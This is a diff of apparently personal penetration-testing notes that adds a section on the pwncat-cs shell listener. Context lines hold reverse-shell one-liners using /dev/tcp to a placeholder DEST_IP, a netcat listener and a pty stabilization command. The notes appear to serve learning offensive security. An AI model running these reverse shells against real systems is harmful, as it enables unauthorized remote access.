@@ -3,6 +3,7 @@
 - [Existing Tools](#existing-tools)
   - [Ping and Port Scanning](#ping-and-port-scanning)
 - [Shells](#shells)
+  - [PWNCAT-CS](#pwncat-cs)
   - [Stabilizing](#stabilizing)
 - [Privilege Escalation](#privilege-escalation)
   - [shared libraries](#shared-libraries)
@@ -45,6 +46,7 @@
 - id
 - last = who used
 - sudo -l = commands for invoking user
+  - what kind of command can be run
   
 - ifconfig - nmcli dev show / ipconfig /all
   
@@ -87,6 +89,14 @@
       - bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
       - bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
   - Ziel: nc -nlvp PORT
+
+## PWNCAT-CS
+- nc with steroids
+- python version => stabilized
+- easier to transfer file
+- python3 -m venv pwncat-env
+- source pwncat-env/bin/activate
+- pwncat-cs -lp PORT
 
 ## Stabilizing
 -  python3 -c 'import pty;pty.spawn("/bin/bash")' = better view
